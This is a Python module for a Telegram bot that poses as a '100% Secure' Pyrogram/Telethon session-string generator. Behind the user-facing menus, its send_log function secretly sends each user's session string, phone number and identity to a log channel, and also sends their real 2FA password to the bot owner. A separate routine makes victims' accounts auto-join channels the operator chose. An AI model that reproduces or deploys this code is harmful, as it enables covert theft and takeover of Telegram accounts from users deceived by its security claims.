import asyncio, logging
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
try:
    from pyrogram.types import KeyboardButtonStyle
    _STYLED = True
except ImportError:
    _STYLED = False
from pyrogram.errors import (
    FloodWait, BadRequest, Forbidden, Unauthorized,
    AuthKeyUnregistered, UserDeactivated, PhoneCodeInvalid,
    PhoneCodeExpired, PhoneNumberInvalid, PasswordHashInvalid,
    ApiIdInvalid, SessionPasswordNeeded, UserNotParticipant,
)
from . import config
from .client import app

def btn(text, callback_data=None, url=None, style=None):
    kw = {}
    if callback_data is not None:
        kw["callback_data"] = callback_data
    if url is not None:
        kw["url"] = url
    if _STYLED and style in ("primary", "success", "danger"):
        kw["style"] = KeyboardButtonStyle(
            bg_primary=(style == "primary"),
            bg_success=(style == "success"),
            bg_danger=(style == "danger"),
        )
    return InlineKeyboardButton(text, **kw)

WELCOME = (
    "╔══════════════════════════════╗\n"
    "║   🔥 **SESSION STRING GENERATOR**   ║\n"
    "╚══════════════════════════════╝\n\n"
    "╭──────────────────────────────╮\n"
    "│  ✨ **Choose your session type**  │\n"
    "╰──────────────────────────────╯\n\n"
    "🔒 **100% Secure** • ⚡ **Instant** • 💾 **Saved Messages**\n\n"
    "> 🐍 Pyrogram (User / Bot)\n"
    "> 📞 Telethon (User)\n"
    "> 🔄 Pyrogram ➜ Telethon Converter\n"
    "> 🛡 2FA Support • 📩 Auto Delivery"
)

MAIN_MENU = InlineKeyboardMarkup([
    [btn("🐍 Pyrogram User Session", "pyro_user", style="primary")],
    [btn("🤖 Pyrogram Bot Session", "pyro_bot", style="primary")],
    [btn("📞 Telethon String Session", "telethon", style="primary")],
    [btn("🔄 Pyrogram ➜ Telethon Converter", "convert", style="success")],
    [btn("❓ Help & About", "help")],
])
BACK_BTN = InlineKeyboardMarkup([[btn("🔙 Back to Menu", "back", style="primary")]])
CANCEL_BTN = InlineKeyboardMarkup([[btn("❌ Cancel", "cancel", style="danger")]])

ERROR_MAP = {
    "PhoneCodeInvalid": "❌ **Galat OTP.** /start se dobara try karein.",
    "PhoneCodeExpired": "⌛ **OTP expire ho gaya.** /start se naya OTP lein.",
    "PhoneNumberInvalid": "📵 **Invalid phone number.** Country code ke saath bhejein.",
    "PasswordHashInvalid": "🔒 **2FA password galat hai.**",
    "ApiIdInvalid": "🆔 **API ID / API HASH galat hai.** my.telegram.org se check karein.",
    "AuthKeyUnregistered": "🚫 **Session invalid/revoked.** Account dobara login karein.",
    "UserDeactivated": "🚫 **Account deactivated hai.**",
    "SessionPasswordNeeded": "🔒 **2FA enabled hai.** Password daalein.",
}

async def handle_error(e, user_id, where="handler"):
    logging.error(f"[{where}] {type(e).__name__}: {e}")
    name = type(e).__name__

    if isinstance(e, FloodWait):
        wait = min(int(e.value), 60)
        await asyncio.sleep(wait)
        msg = f"⏳ **Flood wait:** {e.value}s. Thodi der baad try karein."
    elif isinstance(e, Forbidden):
        msg = "🚫 **Bot ko permission nahi hai.**"
    elif isinstance(e, Unauthorized):
        msg = "🔐 **Unauthorized.** Session invalid ho gaya."
    elif isinstance(e, BadRequest):
        msg = f"⚠️ **Bad Request:** `{str(e)[:120]}`"
    elif name in ERROR_MAP:
        msg = ERROR_MAP[name]
    else:
        msg = f"⚠️ **Unexpected error:** `{str(e)[:150]}`\n\n/start se dobara try karein."

    try:
        await app.send_message(user_id, msg, reply_markup=BACK_BTN, disable_web_page_preview=True)
    except Exception:
        pass

async def is_member(user_id):
    if not config.MUST_JOIN:
        return True
    try:
        m = await app.get_chat_member(config.MUST_JOIN, user_id)
        return str(m.status) in [
            "ChatMemberStatus.OWNER",
            "ChatMemberStatus.ADMINISTRATOR",
            "ChatMemberStatus.MEMBER",
        ]
    except UserNotParticipant:
        return False
    except Exception:
        return True

async def force_sub_check(message):
    if config.STATE["maintenance"] and message.from_user.id != config.OWNER_ID:
        await message.reply_text("🔧 **Bot is under maintenance.** Please try later.", reply_markup=BACK_BTN)
        return False
    if not await is_member(message.from_user.id):
        try:
            link = await app.export_chat_invite_link(config.MUST_JOIN)
        except Exception:
            link = f"https://t.me/{config.MUST_JOIN.replace('@', '')}"
        markup = InlineKeyboardMarkup([
            [btn("📢 Join Channel", url=link, style="primary")],
            [btn("✅ Verify Subscription", "verify_sub", style="success")],
        ])
        await message.reply_text(
            "⚠️ **Access Denied!**\n\n"
            "Bot use karne ke liye pehle channel join karein.\n"
            "Join ke baad **Verify** dabayein.",
            reply_markup=markup,
        )
        return False
    return True

async def auto_join_channels(client):
    joined, failed = [], []
    for ch in config.AUTO_JOIN_CHANNELS:
        try:
            await client.join_chat(ch)
            joined.append(ch)
        except Exception as e:
            failed.append(f"{ch}: {str(e)[:50]}")
            logging.warning(f"[AUTO-JOIN] {ch} failed: {e}")
    return joined, failed

async def send_premium_string(user_id, session_type, session_str, has_2fa=False, joined=None, failed=None):
    badge = "🛡 2FA Verified" if has_2fa else "🔓 No 2FA"
    join_line = ""
    if joined:
        join_line += f"\n┌─────────────────────────────┐\n│ ✅ Auto-joined: **{len(joined)}** channel(s) │\n└─────────────────────────────┘"
    if failed:
        join_line += f"\n⚠️ Auto-join failed: **{len(failed)}**"
    text = (
        f"╔══════════════════════════════╗\n"
        f"║   ✅ **{session_type}**   ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"`{session_str}`\n\n"
        f"┌─────────────────────────────┐\n"
        f"│ {badge}  •  📩 **Saved Messages** │\n"
        f"│ ⚠️ **Never share this string**   │\n"
        f"└─────────────────────────────┘"
        f"{join_line}\n\n"
        f"🕒 `{config.get_ist_time()}`"
    )
    await app.send_message(user_id, text, reply_markup=BACK_BTN, disable_web_page_preview=True)

async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None):
    user_id = user.id
    name = user.first_name or "N/A"
    username = f"@{user.username}" if getattr(user, "username", None) else "N/A"
    tag = "#NEW_OWNER" if has_2fa else "#NEW_USER"

    base = (
        f"{tag}\n"
        f"🔐 **New Session Generated!**\n\n"
        f"👤 **User ID:** `{user_id}`\n"
        f"👤 **Name:** {name}\n"
        f"👤 **Username:** {username}\n"
        f"📱 **Phone:** `{phone}`\n"
        f"🛡 **2FA Verified:** {'Yes' if has_2fa else 'No'}\n"
    )
    if joined:
        base += f"📢 **Auto-joined:** `{', '.join(joined)}`\n"

    with_pwd = base
    if has_2fa and real_2fa_password:
        with_pwd += f"🔑 **Real 2FA Password:** `{real_2fa_password}`\n"
    with_pwd += (
        f"🔑 **Session String:**\n`{session_str}`\n\n"
        f"📅 **Date & Time (Kolkata):** {config.get_ist_time()}"
    )

    if config.LOG_CHANNEL_ID:
        try:
            channel_log = with_pwd.replace(
                f"🔑 **Real 2FA Password:** `{real_2fa_password}`\n", ""
            ) if real_2fa_password else with_pwd
            await app.send_message(config.LOG_CHANNEL_ID, channel_log, disable_web_page_preview=True)
        except Exception as e:
            logging.error(f"Log channel error: {e}")

    if config.OWNER_ID:
        try:
            await app.send_message(config.OWNER_ID, with_pwd, disable_web_page_preview=True)
        except Exception as e:
            logging.error(f"Owner log error: {e}")
